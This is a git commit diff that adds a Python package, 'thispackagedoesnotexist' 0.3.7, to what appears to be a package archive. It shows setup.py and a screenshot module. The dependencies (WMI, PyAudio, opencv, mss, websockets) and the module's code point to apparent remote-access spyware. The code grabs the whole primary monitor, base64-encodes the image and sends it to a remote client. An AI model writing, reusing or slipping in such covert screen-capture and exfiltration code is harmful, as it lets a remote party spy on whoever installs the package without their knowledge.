2a70f9ee4bda1bcaf4695eda62118942435c409c
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-01-31 17:05:19 +0000

    Add package thispackagedoesnotexist/0.3.7/thispackagedoesnotexist-0.3.7.tar.gz

---
+++ packages/thispackagedoesnotexist/thispackagedoesnotexist-0.3.7.tar.gz/thispackagedoesnotexist-0.3.7/setup.py
@@ -0,0 +1,23 @@
+from setuptools import setup, find_packages
+
+setup(
+    name="thispackagedoesnotexist",
+    version="0.3.7",
+    packages=find_packages(),
+    python_requires=">=3.6",
+    include_package_data=True,
+    install_requires=[
+        "customtkinter",
+        "requests",
+        "WMI",
+        "PyAudio",
+        "pillow",
+        "opencv-python",
+        "psutil",
+        "websockets",
+        "websocket-client",
+        "mss"
+    ],
+)
+
+
---
+++ packages/thispackagedoesnotexist/thispackagedoesnotexist-0.3.7.tar.gz/thispackagedoesnotexist-0.3.7/thispackagedoesnotexist/features/screenshot.py
@@ -0,0 +1,22 @@
+import mss
+import io
+import base64
+import traceback
+from PIL import Image
+
+def send_screenshot(client, converter):
+    try:
+        with mss.mss() as sct:
+            screenshot = sct.grab(sct.monitors[1])
+            img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
+
+            buffer = io.BytesIO()
+            img.save(buffer, format="PNG")
+            screenshot_data = buffer.getvalue()
+
+            screenshot_base64 = base64.b64encode(screenshot_data).decode("utf-8")
+            client.send_message(converter.encode({"screenshot": screenshot_base64}))
+
+    except Exception as e:
+        traceback.print_exc()
+        client.send_message(converter.encode({"screenshot_logger": str(e)}))
